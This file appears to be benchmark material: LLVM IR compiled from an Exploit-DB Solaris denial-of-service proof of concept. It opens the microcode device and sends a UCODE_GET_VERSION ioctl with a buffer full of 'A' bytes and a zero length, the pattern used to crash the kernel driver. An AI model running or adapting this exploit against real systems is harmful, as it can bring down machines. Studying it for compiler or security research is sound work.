; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_11351.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_11351.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ucode_get_rev_struct = type { i32, i64, i32* }

@BUF_SIZE = common dso_local global i32 0, align 4
@UCODE_DEV = common dso_local global i32 0, align 4
@O_RDONLY = common dso_local global i32 0, align 4
@UCODE_GET_VERSION = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [14 x i8] c"[+] ret = %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"[+] ugv_errno = %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca %struct.ucode_get_rev_struct, align 8
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @BUF_SIZE, align 4
  %8 = zext i32 %7 to i64
  %9 = call i8* @llvm.stacksave()
  store i8* %9, i8** %4, align 8
  %10 = alloca i32, i64 %8, align 16
  store i64 %8, i64* %5, align 8
  %11 = load i32, i32* @BUF_SIZE, align 4
  %12 = call i32 @memset(i32* %10, i32 65, i32 %11)
  %13 = getelementptr inbounds %struct.ucode_get_rev_struct, %struct.ucode_get_rev_struct* %6, i32 0, i32 2
  store i32* %10, i32** %13, align 8
  %14 = getelementptr inbounds %struct.ucode_get_rev_struct, %struct.ucode_get_rev_struct* %6, i32 0, i32 1
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* @UCODE_DEV, align 4
  %16 = load i32, i32* @O_RDONLY, align 4
  %17 = call i32 @open(i32 %15, i32 %16)
  store i32 %17, i32* %2, align 4
  %18 = load i32, i32* %2, align 4
  %19 = load i32, i32* @UCODE_GET_VERSION, align 4
  %20 = call i32 @ioctl(i32 %18, i32 %19, %struct.ucode_get_rev_struct* %6)
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i32 %21)
  %23 = getelementptr inbounds %struct.ucode_get_rev_struct, %struct.ucode_get_rev_struct* %6, i32 0, i32 0
  %24 = load i32, i32* %23, align 8
  %25 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i32 %24)
  %26 = load i32, i32* %2, align 4
  %27 = call i32 @close(i32 %26)
  %28 = load i32, i32* %3, align 4
  store i32 %28, i32* %1, align 4
  %29 = load i8*, i8** %4, align 8
  call void @llvm.stackrestore(i8* %29)
  %30 = load i32, i32* %1, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i32*, i32, i32) #2

declare dso_local i32 @open(i32, i32) #2

declare dso_local i32 @ioctl(i32, i32, %struct.ucode_get_rev_struct*) #2

declare dso_local i32 @printf(i8*, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
